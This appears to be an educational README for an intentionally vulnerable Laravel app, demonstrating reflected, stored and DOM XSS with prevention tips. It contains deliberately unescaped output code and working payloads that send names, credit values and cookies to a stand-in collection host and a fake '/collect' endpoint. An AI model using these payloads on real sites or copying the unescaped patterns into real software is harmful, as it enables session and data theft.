# XSS Attacks Demonstration

This document explains the XSS vulnerabilities implemented in this application for educational purposes.

## Overview

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject client-side scripts into web pages viewed by other users. This application intentionally contains several XSS vulnerabilities to demonstrate how they work and how they can be exploited.

## Types of XSS Attacks Demonstrated

### 1. Reflected XSS

Reflected XSS occurs when user input is immediately returned by a web application without proper sanitization.

**Vulnerable Code:**
```php
// In ProductsController.php
$searchKeywords = $request->keywords;
return view('products.list', compact('products', 'searchKeywords'));

// In list.blade.php
<h4>Search Results for: {!! $searchKeywords !!}</h4>
```

**Example Payload:**
```html
<script>fetch('http://websecservice.localhost.com/collect?name='+document.getElementById('user-name').innerText+'&credit='+document.getElementById('user-credit').innerText);</script>
```

**How to Test:**
1. Go to the Products page
2. Enter the payload in the search box
3. Submit the search
4. The script will execute and send user data to the collect endpoint

### 2. Stored XSS

Stored XSS occurs when user input is stored on the target server and then displayed to other users without proper sanitization.

In this demo, we're simulating stored XSS with the search history feature that stores search terms in the DOM.

**Example Payload:**
```html
<script>
var searchHistory = [];
document.getElementById('search-form').addEventListener('submit', function(e) {
    var keywords = document.getElementById('search-keywords').value;
    searchHistory.push(keywords);
    fetch('/collect?activity=search_history&data='+encodeURIComponent(JSON.stringify(searchHistory)));
});
</script>
```

### 3. DOM-based XSS

DOM-based XSS occurs when client-side JavaScript modifies the DOM in an unsafe way based on user input.

**Vulnerable Code:**
```javascript
// Function to parse URL parameters (vulnerable to DOM XSS)
function getUrlParameter(name) {
    name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
    var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
    var results = regex.exec(location.search);
    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
}

// DOM XSS vulnerability: directly inserting URL parameter into DOM
document.addEventListener('DOMContentLoaded', function() {
    var searchTerm = getUrlParameter('keywords');
    
    if (searchTerm) {
        var historyDiv = document.getElementById('search-history');
        if (historyDiv) {
            var searchItem = document.createElement('div');
            searchItem.innerHTML = '<p>Recent search: ' + searchTerm + '</p>';
            historyDiv.appendChild(searchItem);
        }
    }
});
```

**Example Payload:**
```html
<img src="x" onerror="fetch('/collect?dom_xss=true&data='+document.cookie)" />
```

**How to Test:**
1. Visit: `/products?keywords=<img src='x' onerror='fetch(`/collect?dom_xss=true&data=${document.cookie}`)'>`
2. The JavaScript in the URL parameter will be executed when the page loads
3. Check the collect endpoint logs to see the captured data

## The Collect Endpoint

The application includes a `/collect` endpoint that simulates a malicious server collecting stolen data:

```php
public function collect(Request $request)
{
    // Log all collected data
    Log::info('Data collected:', $request->all());
    
    // Return a simple response
    return response()->json([
        'status' => 'success',
        'message' => 'Data collected successfully',
        'data' => $request->all()
    ]);
}
```

## Prevention Techniques

To prevent XSS attacks in a real application, you should:

1. **Output Encoding**: Always encode user input before displaying it
   ```php
   {{ htmlspecialchars($userInput) }}
   ```

2. **Content Security Policy (CSP)**: Implement a strict CSP to prevent execution of inline scripts
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

3. **Input Validation**: Validate and sanitize all user inputs on both client and server sides

4. **Use Laravel's {{ }} Syntax**: Laravel's `{{ }}` automatically escapes output, while `{!! !!}` does not

## Disclaimer

This code contains intentional security vulnerabilities for educational purposes only. Do not use these techniques in a production environment or for malicious purposes.
